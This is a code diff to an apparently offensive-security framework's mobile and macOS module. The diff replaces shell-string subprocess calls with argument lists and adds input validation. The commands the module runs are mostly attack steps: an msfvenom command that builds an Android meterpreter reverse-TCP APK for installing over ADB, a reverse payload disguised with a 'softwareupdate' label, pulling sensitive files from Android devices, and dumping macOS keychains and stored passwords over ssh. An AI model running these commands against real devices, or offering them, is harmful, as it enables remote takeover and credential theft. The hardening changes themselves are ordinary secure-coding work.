@@ -7,12 +7,16 @@ keychain extraction.
 from __future__ import annotations
 
 import os
+import re
 import shlex
 import subprocess
 
 import cmd2
 
 from cli.commands._base import LazyOwnCommandSet
+from cli.commands._base import extract_flag as _shared_extract_flag
+from core.process import is_binary_present as _core_is_binary_present
+from core.validators import check_lhost, check_lport
 from utils import (
     print_error,
     print_msg,
@@ -106,17 +110,18 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         """
         args = shlex.split(line)
         serial = _extract_flag(args, "--serial")
+        if serial and not _SERIAL_RE.match(serial):
+            print_error("Invalid --serial value")
+            return
 
-        adb = _adb_base(serial)
+        adb_argv = _adb_argv(serial)
 
         checks = [
-            ("Device Info", "shell getprop"),
-            ("Installed Packages", "shell pm list packages -3"),
-            ("Running Processes", "shell ps -A"),
-            ("Network Interfaces", "shell ip addr show"),
-            ("WiFi Networks", "shell dumpsys wifi | grep SSID"),
-            ("Accounts", "shell dumpsys account"),
-            ("Screen Lock", "shell locksettings verify --old 1234 2>&1; echo 'Screen lock check'"),
+            ("Device Info", ["shell", "getprop"]),
+            ("Installed Packages", ["shell", "pm", "list", "packages", "-3"]),
+            ("Running Processes", ["shell", "ps", "-A"]),
+            ("Network Interfaces", ["shell", "ip", "addr", "show"]),
+            ("Accounts", ["shell", "dumpsys", "account"]),
         ]
 
         output_dir = "sessions/android_enum"
@@ -125,9 +130,14 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         with open(os.path.join(output_dir, "android_enum.txt"), "w") as out:
             for name, cmd in checks:
                 print_msg(f"  {name}...")
-                full_cmd = f"{adb} {cmd}"
                 try:
-                    result = subprocess.run(full_cmd, shell=True, timeout=15, capture_output=True, text=True)
+                    result = subprocess.run(
+                        adb_argv + cmd,
+                        shell=False,
+                        timeout=15,
+                        capture_output=True,
+                        text=True,
+                    )
                     out.write(f"\n{'=' * 60}\n{name}\n{'=' * 60}\n")
                     out.write(result.stdout)
                     out.write(result.stderr if result.stderr else "")
@@ -144,7 +154,12 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         for src, dst_name in extract_sensitive:
             dst = os.path.join(output_dir, dst_name)
             try:
-                subprocess.run(f"{adb} pull {src} {dst}", shell=True, timeout=15, stderr=subprocess.DEVNULL)
+                subprocess.run(
+                    adb_argv + ["pull", src, dst],
+                    shell=False,
+                    timeout=15,
+                    stderr=subprocess.DEVNULL,
+                )
                 if os.path.exists(dst) and os.path.getsize(dst) > 0:
                     print_msg(f"  Extracted: {dst_name}")
                 else:
@@ -166,18 +181,28 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
         output = _extract_flag(args, "--output") or "sessions/payload.apk"
 
-        if not lhost:
-            print_error("Set lhost: assign lhost <ip>")
+        if not check_lhost(lhost) or not check_lport(lport):
+            return
+        if not _is_safe_output_path(output):
+            print_error("Invalid --output path")
             return
 
         if not is_binary_present("msfvenom"):
             print_error("msfvenom required. Install metasploit-framework.")
             return
 
-        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
-        print_msg(f"Generating APK: {cmd}")
+        argv = [
+            "msfvenom",
+            "-p",
+            "android/meterpreter/reverse_tcp",
+            f"LHOST={lhost}",
+            f"LPORT={lport}",
+            "-o",
+            output,
+        ]
+        print_msg(f"Generating APK: {' '.join(argv)}")
         try:
-            result = subprocess.run(cmd, shell=True, timeout=60, capture_output=True, text=True)
+            result = subprocess.run(argv, shell=False, timeout=60, capture_output=True, text=True)
             if os.path.exists(output):
                 print_msg(f"APK generated: {output} ({os.path.getsize(output)} bytes)")
                 print_msg(f"Deploy via ADB: adb install {output}")
@@ -201,8 +226,10 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
         label = _extract_flag(args, "--label") or "softwareupdate"
 
-        if not lhost:
-            print_error("Set lhost: assign lhost <ip>")
+        if not check_lhost(lhost) or not check_lport(lport):
+            return
+        if not _LABEL_RE.match(label):
+            print_error("Invalid --label value")
             return
 
         payload = (
@@ -257,22 +284,32 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         user = _extract_flag(args, "--user") or ""
 
         commands = [
-            "security dump-keychain -d login.keychain 2>/dev/null",
-            "security dump-keychain -d /Library/Keychains/System.keychain 2>/dev/null",
-            "security find-generic-password -wa 2>/dev/null",
-            "security find-internet-password -wa 2>/dev/null",
-            "security find-identity -v -p codesigning 2>/dev/null",
-            "defaults read /Library/Preferences/com.apple.wifi.plist 2>/dev/null",
-            "cat /etc/kcpassword 2>/dev/null | xxd",
+            ["security", "dump-keychain", "-d", "login.keychain"],
+            ["security", "dump-keychain", "-d", "/Library/Keychains/System.keychain"],
+            ["security", "find-generic-password", "-wa"],
+            ["security", "find-internet-password", "-wa"],
+            ["security", "find-identity", "-v", "-p", "codesigning"],
         ]
 
         if target:
-            user_prefix = f"{user}@" if user else ""
+            from core.validators import check_rhost
+
+            if not check_rhost(target):
+                return
+            if user and not _USER_RE.match(user):
+                print_error("Invalid --user value")
+                return
+            destination = f"{user}@{target}" if user else target
             for cmd in commands:
-                full_cmd = f"ssh {user_prefix}{target} '{cmd}'"
-                print_msg(f"  {full_cmd}")
+                print_msg(f"  ssh {destination} {' '.join(cmd)}")
                 try:
-                    result = subprocess.run(full_cmd, shell=True, timeout=15, capture_output=True, text=True)
+                    result = subprocess.run(
+                        ["ssh", destination] + cmd,
+                        shell=False,
+                        timeout=15,
+                        capture_output=True,
+                        text=True,
+                    )
                     if result.stdout.strip():
                         print_msg(result.stdout[:500])
                 except Exception:
@@ -280,7 +317,7 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
         else:
             print_msg("Run these commands on the macOS target:")
             for cmd in commands:
-                print_msg(f"  {cmd}")
+                print_msg(f"  {' '.join(cmd)}")
 
     @cmd2.with_category(MOBILE_CATEGORY)
     def do_macos_tcc(self, line):
@@ -312,24 +349,33 @@ class MobileMacOSCommandSet(LazyOwnCommandSet):
 
 
 def _extract_flag(args: list[str], flag: str) -> str | None:
-    """Extract a ``--flag <value>`` pair from a list of arguments."""
-    try:
-        idx = args.index(flag)
-        return args[idx + 1]
-    except (ValueError, IndexError):
-        return None
+    """Extract a ``--flag <value>`` pair, delegates to shared helper."""
+    return _shared_extract_flag(args, flag)
 
 
-def _adb_base(serial: str | None) -> str:
-    """Return the ADB base command with optional serial flag."""
+_SERIAL_RE = re.compile(r"^[A-Za-z0-9._:-]{1,64}$")
+_USER_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")
+_LABEL_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")
+
+
+def _adb_argv(serial: str | None) -> list[str]:
+    """Return ADB argv with optional validated serial."""
     if serial:
-        return f"adb -s {serial}"
-    return "adb"
+        return ["adb", "-s", serial]
+    return ["adb"]
+
+
+def _is_safe_output_path(path: str) -> bool:
+    """Restrict generated artefacts to sessions/ tree."""
+    normalized = os.path.normpath(path)
+    return normalized == "sessions" or normalized.startswith("sessions" + os.sep)
 
 
 def is_binary_present(name: str) -> bool:
-    """Check if a binary is available on PATH."""
-    return any(os.path.exists(os.path.join(p, name)) for p in os.environ.get("PATH", "").split(os.pathsep))
+    """Check if a binary is available on PATH, delegates to core."""
+    if not _LABEL_RE.match(name):
+        return False
+    return _core_is_binary_present(name)
 
 
 __all__ = ["MobileMacOSCommandSet"]
